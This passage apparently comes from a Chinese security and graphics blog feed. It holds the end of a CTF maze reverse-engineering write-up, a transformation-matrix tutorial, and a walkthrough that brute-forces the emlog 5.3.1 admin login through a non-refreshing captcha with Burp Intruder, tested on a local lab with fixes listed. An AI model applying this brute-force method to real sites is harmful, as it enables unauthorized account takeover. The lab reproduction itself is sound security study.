<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>• sub_400660</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">bool __fastcall <span class="token function">sub_400660</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax</span>

  v1 <span class="token operator">=</span> <span class="token operator">*</span>a1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>a1 <span class="token operator">=</span> v1<span class="token punctuation">;</span>
  <span class="token keyword">return</span> v1 <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>之后的sub_400670和sub_400650一样，sub_400680和sub_400660，分别执行减一加一的操作，这也验证了我们的猜想是代表走迷宫的上下左右移动。但我们仍然不知道哪个代表 x 轴的移动，哪个代表 y 轴的移动。同时两个函数中还包含着一个关键性的信息，<code>return v1 &gt; 0;</code>和 <code>return v1 &lt; 8;</code>猜测是代表<strong>迷宫的大小为 8*8</strong>。</p>
<p>所以究竟谁是 x 轴谁是 y 轴，还有起点在哪儿呢？继续观察上述代码，O和o对应的函数参数为 v10，而 . 和0对应的是 v9，回到参数定义的位置</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h] BYREF</span>
<span class="token keyword">int</span> v10<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h] BYREF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这边我没琢磨懂，看了亿眼别人的wp，发现他是这么说的（<a href="https://blog.csdn.net/afanzcf/article/details/119455357"><a href="https://blog.csdn.net/afanzcf/article/details/119455357">攻防世界 maze_别害怕我在的博客-CSDN博客_maze攻防世界</a></a>）</p>
<blockquote>
<p>加4的就是 x 轴，不加4 的就是 y 轴。</p>
</blockquote>
<p>…还是不太明白QAQ，<del>不过个人感觉无非就是两种情况，都试一下问题应该也不大</del>。同时回到main函数的汇编代码段，可见起点是（0，0）</p>
<p><img src="/2022/05/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse-maze/image-20220512173846318.png" alt="image-20220512173846318" loading="lazy"></p>
<h2 id="画图获取flag"><a href="#画图获取flag" class="headerlink" title="画图获取flag"></a>画图获取flag</h2><p>这样所有逻辑都理清了，即</p>
<blockquote>
<p> flag 的基本格式为 <code>nctf&#123;18个字符&#125;</code></p>
<p>地图是 8*8，将字符串分为此规格即可</p>
<p>O、o、.  、0 代表控制上下左右走出迷宫的四个方向符</p>
<p>O、o分别代表 x 轴左、右移动</p>
<p>. 、0分别代表 y 轴上、下移动</p>
</blockquote>
<p>然后就是画图走迷宫了，可以手画也可以代码。这边量不大我就手画了</p>
<p><img src="/2022/05/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse-maze/image-20220512174333325.png" alt="image-20220512174333325" loading="lazy"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>emlog5.3.1后台暴力破解</title>
    <url>/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>Emlog博客系统默认后台登陆地址为http:&#x2F;&#x2F;域名&#x2F;admin&#x2F;login.php。后台登陆时，错误情况下，验证码未刷新，导致可暴力破解登陆管理员账号。虽然属于低危漏洞，但是在emlog5.3.1和6.0测试版本均存在，不容忽视。</p>
<span id="more"></span>

<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>在admin文件夹下的global.php中有这么一段</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'login'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
   <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
   <span class="token variable">$ispersis</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ispersis'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ispersis'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name return-type">false</span><span class="token punctuation">;</span>
   <span class="token variable">$img_code</span> <span class="token operator">=</span> <span class="token class-name static-context">Option</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'login_code'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'y'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imgcode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imgcode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

    <span class="token variable">$loginAuthRet</span> <span class="token operator">=</span> <span class="token class-name static-context">LoginAuth</span><span class="token operator">::</span><span class="token function">checkUser</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$img_code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$loginAuthRet</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token class-name static-context">LoginAuth</span><span class="token operator">::</span><span class="token function">setAuthCookie</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$ispersis</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">emDirect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
      <span class="token class-name static-context">LoginAuth</span><span class="token operator">::</span><span class="token function">loginPage</span><span class="token punctuation">(</span><span class="token variable">$loginAuthRet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当登陆失败的时候，并没有销毁session，验证码没有刷新，可重复使用，导致能够暴力破解。</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="phpstudy搭建网站"><a href="#phpstudy搭建网站" class="headerlink" title="phpstudy搭建网站"></a>phpstudy搭建网站</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>这是网站源码的压缩包：<a href="https://pan.baidu.com/s/1D71IxfCy8Bonh9sBToNDxA">emlog5.3.1.zip</a>，提取码是rox1</p>
<p>我们下载之后就可以开始搭建了</p>
<h3 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h3><p>首先将下载的压缩包解压到小皮的网站根目录下，以我的为例，即<code>D:\phpstudy_pro\WWW</code>。可以把解压之后的文件夹重命名，这样好记且有便于后续的操作，我把它改成了<code>emlog</code>。之后进入小皮的网站模块，点击创建网站，域名改为重命名之后的名字（没改的话就将域名设为你根目录下的名字）。这边一定要注意的是<strong>PHP版本</strong>，由于PHP7已经不支持mysql扩展了，但是支持mysqli和pdo_mysql，而我用的是mysql且网站要求配置的也是mysql，所以php版本就不能选的太高，不然后续网站搭不起来。所以这边创建网站就直接选低版本的php即可，当然如果没注意到这点，后续也可以在网站管理模块将php版本调低（我就是这样的，一开始不知道有这个坑）。</p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512202019059.png" alt="image-20220512202019059" loading="lazy"></p>
<p>这样网站就搭好了，之后点击管理—&gt;打开网站，现在配置MySQL。数据库名设为<code>emlog</code>，这边我是自己创建了一个，因为他说了不会自动创建数据库。之后的mysql用户名和密码就是自己的用户名和密码（如果忘了可以看小皮的数据库模块，里面有记录）。</p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512202603086.png" alt="image-20220512202603086" loading="lazy"></p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512202800456.png" alt="image-20220512202800456" loading="lazy"></p>
<p>再来注册一个管理员账户，这边随便设置就行了，此处我把用户名和密码都设成了<code>admin</code>123。之后开始安装就可以了。</p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512202726378.png" alt="image-20220512202726378" loading="lazy"></p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512202818346.png" alt="image-20220512202818346" loading="lazy"></p>
<h2 id="Burpsuite抓包"><a href="#Burpsuite抓包" class="headerlink" title="Burpsuite抓包"></a>Burpsuite抓包</h2><h3 id="开始爆破"><a href="#开始爆破" class="headerlink" title="开始爆破"></a>开始爆破</h3><p>网站搭建完成之后，进入网站首页。点击登录即可进入后台登录界面，我们虽然知道管理员的账号密码（刚创建的），但我们此时为了测试默认是不知道管理员的账号名称以及密码的。在登陆界面随便输个，这边很奇怪啊，我的这个后台登陆界面没有验证码不知道为啥，不过也不影响，因为这里的验证码本来就是形同虚设的。</p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512203639119.png" alt="image-20220512203639119" loading="lazy"></p>
<p>之后burp抓包</p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512203602005.png" alt="image-20220512203602005" loading="lazy"></p>
<p>可以看到我们输入的用户名和密码。快捷键 ctrl+I 将包发送到 intruder 模块。进入 positions 模块更改攻击类型为 Cluster bomb，并选择要破解的变量 user 和 pw （注意选择变量的先后顺序，这关乎到后面对应内容的破解）</p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512203740628.png" alt="image-20220512203740628" loading="lazy"></p>
<h3 id="四种攻击方式"><a href="#四种攻击方式" class="headerlink" title="四种攻击方式"></a>四种攻击方式</h3><p>在上述，我们为什么要把攻击类型改为 Cluster bomb 呢？首先我们要了解 burpsuite 的四种攻击类型</p>
<p>1、狙击手模式（Sniper）</p>
<table>
<thead>
<tr>
<th>Attack No.</th>
<th>Position A</th>
<th>Position B</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>null</td>
</tr>
<tr>
<td>1</td>
<td>2</td>
<td>null</td>
</tr>
<tr>
<td>2</td>
<td>null</td>
<td>1</td>
</tr>
<tr>
<td>3</td>
<td>null</td>
<td>2</td>
</tr>
</tbody></table>
<p>添加一个参数，且假设 payload 有两个，那么就会执行两次；<br>添加两个参数，就会挨个来，第一个参数开始爆破时，第二个不变，如此这样，就会执行四次</p>
<p>我个人理解来看，这是唯一一个多个参数不能同时爆破的攻击类型</p>
<p>2、攻城锤模式（Battering ram）</p>
<table>
<thead>
<tr>
<th>Attack No.</th>
<th>Position A</th>
<th>Position B</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>2</td>
<td>2</td>
</tr>
</tbody></table>
<p>与sniper模式不同的地方在于，同样情况下，攻击次数减半，且每次两个位置用相同的密码</p>
<p>3、草叉模式（Pitchfork）</p>
<table>
<thead>
<tr>
<th>Attack No.</th>
<th>Position A</th>
<th>Position B</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>3</td>
</tr>
<tr>
<td>1</td>
<td>2</td>
<td>4</td>
</tr>
</tbody></table>
<p>可以多组密码本payload，又与攻城锤模式相同的地方在于一一对应</p>
<p>4、集束炸弹模式（Cluster bomb）</p>
<table>
<thead>
<tr>
<th>Attack No.</th>
<th>Position A</th>
<th>Position B</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>3</td>
</tr>
<tr>
<td>1</td>
<td>2</td>
<td>4</td>
</tr>
<tr>
<td>2</td>
<td>1</td>
<td>4</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>4</td>
</tr>
</tbody></table>
<p>跟草叉模式相似的是多个密码本对应多个位置，不同的是不再是一一对应，而是交叉组合（笛卡尔积），每一个密码本里的密码都对应与另一密码本所有密码</p>
<p>所以为什么选择 Cluster bomb 就显而易见了。我们此时并不知道 user 和 pw 的情况，所以我们要让两个变量采用最多的组合方式来进行测试。</p>
<p>继续上述爆破操作，再进入 payload 模块，此时前面所说的顺序性就体现出来了，由于我们先选择的变量是user，所以我们先添加猜测的 user 。如图，这边需要借助字典，但是我没有…其实也不太需要，只是为了测试，所以除了添加正确的之外随便添加一些别的就可以了。</p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512204118046.png" alt="image-20220512204118046" loading="lazy"></p>
<p>之后添加猜测的 pw，步骤跟上面一样。可见此时Request count已经变了，因为选择的攻击模式使得每个用户名和密码都匹配测试一次</p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512204154328.png" alt="image-20220512204154328" loading="lazy"></p>
<p>之后可以进入 options 模块选择攻击的线程等（多线程有助于加快破解速度），此处由于我添加的猜测数据很少，可以直接攻击，点击 start attack，得到最终的结果。我们可以根据 status 和 length 两个模块来判断是否成功。此处看到当两个payload都为admin123时，状态和长度都和其他笛卡尔积不同，猜测这就是管理员账户的信息。</p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512204312603.png" alt="image-20220512204312603" loading="lazy"></p>
<p>尝试登陆成功</p>
<p><img src="/2022/05/12/emlog5-3-1%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/image-20220512204500078.png" alt="image-20220512204500078" loading="lazy"></p>
<h1 id="漏洞修复建议"><a href="#漏洞修复建议" class="headerlink" title="漏洞修复建议"></a>漏洞修复建议</h1><p>1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p>
<p>2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p>
<p>3、增加人机验证机制</p>
<p>4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机图形学一：变换矩阵-Transformation Matrices</title>
    <url>/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本学期中期的时候，出于个人兴趣，用unity自己做了两个小游戏：愤怒的小鸟和合成大西瓜。感觉非常有意思，完成度也还算可以，后续有空会分享一些制作过程和遇到的困难。在做那两个小游戏之前我是完全不了解整个游戏开发的流程的，也没有掌握相关的知识。感觉学校教的一些东西不太相关？由于个人还是想要向游戏行业发展（网安太难了感觉提不起兴趣来），所以觉得有必要来系统地学习一下在国内游戏领域应用十分广泛的计算机图形学（computer graphics）。</p>
<p>我是看的《Fundamentals of Computer Graphics》这本书，俗称虎书。在b站上看的闫令琪老师的课。</p>
<span id="more"></span>

<h1 id="变换矩阵（Transformation-Matrices）"><a href="#变换矩阵（Transformation-Matrices）" class="headerlink" title="变换矩阵（Transformation Matrices）"></a>变换矩阵（Transformation Matrices）</h1><p>变换矩阵是数学线性代数中的一个概念。在线性代数中，线性变换能够用矩阵表示。如果$T$是一个把$R_n$映射到$R_m$的线性变换，且$x$是一个具有$n$个元素的列向量 ，那么我们把$m×n$的矩阵$A$，称为$T$的变换矩阵。</p>
<p>这是百科对变换矩阵的解释。而在图形学中，变换矩阵的作用十分之大，一切物体的缩放，旋转，位移等操作都可以通过变换矩阵作用得到。本文将会介绍一些常用的变换矩阵。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>学习之前我们需要掌握一些线性代数的知识，学过这门课的应该都感觉不难，是最基础的一些知识。<del>遥想当年我线代期末考了满分</del></p>
<blockquote>
<p>向量加减</p>
<p>点乘积、叉乘积、右手螺旋定则</p>
<p>矩阵乘法</p>
</blockquote>
<h1 id="2D线性变换"><a href="#2D线性变换" class="headerlink" title="2D线性变换"></a>2D线性变换</h1><p>既然由上边的定义了解到变换矩阵是通过乘法来体现的，我们就先来复习一下简单的矩阵乘法，接下来的运算都是此基础上的变式。在此式中$\begin{bmatrix} a_1 &amp; a_2\  a_3 &amp; a_4\  \end{bmatrix}$即为变换矩阵。<br>$$<br>\begin{bmatrix} a_1 &amp; a_2\  a_3 &amp; a_4  \end{bmatrix}   \begin{bmatrix}  x\  y \end{bmatrix} &#x3D; \begin{bmatrix}  a_1x+a_2y \  a_3x+a_4y  \end{bmatrix}<br>$$</p>
<h2 id="缩放（Scale）"><a href="#缩放（Scale）" class="headerlink" title="缩放（Scale）"></a>缩放（Scale）</h2><p>缩放就是将物体沿着<strong>坐标轴</strong>进行压缩或拉伸的操作，它的变换矩阵定义如下<br>$$<br>scale(s_x,s_y)&#x3D;\begin{bmatrix} s_x &amp; 0\  0 &amp; s_y\end{bmatrix}<br>$$<br>所以，原来的矩阵与它相乘后变成了这样<br>$$<br>\begin{bmatrix} s_x &amp; 0\  0 &amp; s_y\end{bmatrix}    \begin{bmatrix}  x\  y\end{bmatrix}  &#x3D; \begin{bmatrix}  s_xx \  s_yy\end{bmatrix}<br>$$<br>即除了$(0,0)^T$点不动外，其他点都变成了$(s_xx,s_yy)^T$。即沿着坐标轴按照比例进行了缩放。看两个例子：</p>
<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615191732602.png" alt="image-20220615191732602 " style="zoom:67%;" loading="lazy">

<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615191755485.png" alt="image-20220615191755485 " style="zoom:67%;" loading="lazy">

<h2 id="切变（Shearing）"><a href="#切变（Shearing）" class="headerlink" title="切变（Shearing）"></a>切变（Shearing）</h2><p>切变直观理解就是把物体一边固定，然后拉另外一边。定义以及解释可能都有点抽象，结合图来分析：</p>
<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615192137961.png" alt="image-20220615192137961 " style="zoom:67%;" loading="lazy">

<p>先不用管图中的变换矩阵，根据前面缩放的经验，我们只需找出点与点之间的数量关系即可。由图中可以看出，此变换在$y$轴上并没有做出任何改动，是$x$轴有向右拉伸的意思。再细看发现底端$y&#x3D;0$这条也没有经过任何变换，看最上端这条直线变化最大（我们假设此时$y&#x3D;1$，并向右移动了距离$a$），而原本位于$(0,1)$的这个点，变为了$(a,1)$。再看看中点呢？不难发现，原本位于$(0,\frac{1}{2})$的这个点，变为了$(\frac{a}{2},\frac{1}{2})$。所以在此图中，可以得到其变换矩阵为：<br>$$<br>shear&#x3D;\begin{bmatrix}  1 &amp; a\  0 &amp; 1\end{bmatrix}<br>$$<br>所以，原来的矩阵与它相乘后变成了这样<br>$$<br>\begin{bmatrix} 1 &amp; a\  0 &amp; 1\end{bmatrix}    \begin{bmatrix}  x\  y\end{bmatrix}  &#x3D; \begin{bmatrix}  x+ay \  y\end{bmatrix}<br>$$<br>推广到一般形式，我们可以得到切变的变换矩阵，其中$s&#x3D;tan\phi$，$\phi$为坐标轴与拉伸边的夹角。这边解释一下，对应上图，$\phi$就是$y$轴和左边边的夹角，为啥上面的$tan\phi&#x3D;a$，这个学过三角函数应该都知道。<br>$$<br>shear-x(s)&#x3D;\begin{bmatrix}  1 &amp; s\  0 &amp; 1\end{bmatrix}    \quad\quad<br>shear-y(s)&#x3D;\begin{bmatrix}  1 &amp; 0\  s &amp; 1\end{bmatrix}<br>$$<br>特别的，当$\phi&#x3D;45°$时，$tan\phi&#x3D;1$。</p>
<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615194204250.png" alt="image-20220615194204250 " style="zoom:67%;" loading="lazy">

<h2 id="反射-x2F-对称（Reflection）"><a href="#反射-x2F-对称（Reflection）" class="headerlink" title="反射&#x2F;对称（Reflection）"></a>反射&#x2F;对称（Reflection）</h2><p>这个就没啥好说的了，就是镜面对称的意思。它的变换矩阵定义如下<br>$$<br>reflect-x&#x3D;\begin{bmatrix}  1 &amp; 0\  0 &amp; -1\end{bmatrix}   \quad\quad<br>reflect-y&#x3D;\begin{bmatrix}  -1 &amp; 0\  0 &amp; 1\end{bmatrix}<br>$$<br>所以，原来的矩阵与它相乘后变成了这样，以$x$轴的为例<br>$$<br>\begin{bmatrix} 1 &amp; 0\  0 &amp; -1\end{bmatrix}   \begin{bmatrix}  x\  y\end{bmatrix} &#x3D; \begin{bmatrix}  x \  -y\end{bmatrix}<br>$$<br><img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615194642892.png" alt="image-20220615194642892 sty" style="zoom:70%;" loading="lazy"></p>
<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615194658710.png" alt="image-20220615194658710 " style="zoom:70%;" loading="lazy">

<h2 id="旋转（Rotation）"><a href="#旋转（Rotation）" class="headerlink" title="旋转（Rotation）"></a>旋转（Rotation）</h2><p>旋转就是物体的转动了，先看一下它的变换矩阵<br>$$<br>rotate(\phi)&#x3D;\begin{bmatrix}  cos\phi &amp; -sin\phi\  sin\phi &amp; cos\phi\end{bmatrix}<br>$$<br>呃呃，乍一看很难理解，但我们还是只要弄清它的坐标变换就可以了，贴一张我自己画的分析图，<del>应该还是挺清晰易懂的吧</del></p>
<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615195610994.png" alt="image-20220615195610994 style" style="zoom:40%;" loading="lazy">

<p>所以，原来的矩阵与它相乘后变成了这样<br>$$<br>\begin{bmatrix} cos\phi &amp; -sin\phi\  sin\phi &amp; cos\phi\end{bmatrix}  \begin{bmatrix}  x\  y\end{bmatrix} &#x3D; \begin{bmatrix}  xcos\phi-ysin\phi\  xsin\phi+ycos\phi\end{bmatrix}<br>$$<br>这是旋转$45°$的示例图：</p>
<img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615200128200.png" alt="image-20220615200128200 " style="zoom:70%;" loading="lazy">

<p>补充：由上述可以得到<br>$$<br>rotate(-\phi)&#x3D;\begin{bmatrix}  cos\phi &amp; sin\phi\  -sin\phi &amp; cos\phi \end{bmatrix}<br>$$<br>可以发现，$-\phi$的变换矩阵是$\phi$的变换矩阵的转置，也是$\phi$的变换矩阵的逆矩阵。所以，$-\phi$的变换矩阵的正交矩阵。</p>
<h1 id="平移和仿射变换"><a href="#平移和仿射变换" class="headerlink" title="平移和仿射变换"></a>平移和仿射变换</h1><p>对于一下的举例以及分析，都是针对二维变换。理解之后三维变换也就水到渠成，有类似特征。</p>
<h2 id="平移（Translation）"><a href="#平移（Translation）" class="headerlink" title="平移（Translation）"></a>平移（Translation）</h2><p>我们都希望所有的物体位置变换都能够通过变换矩阵与向量的乘积一次性得到，但是偏偏有这个异类，就是平移。</p>
<p><img src="/2022/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E4%B8%80%EF%BC%9A%E5%8F%98%E6%8D%A2%E7%9F%A9%E9%98%B5-Transformation-Matrices/image-20220615201704972.png" alt="image-20220615201704972" loading="lazy"></p>
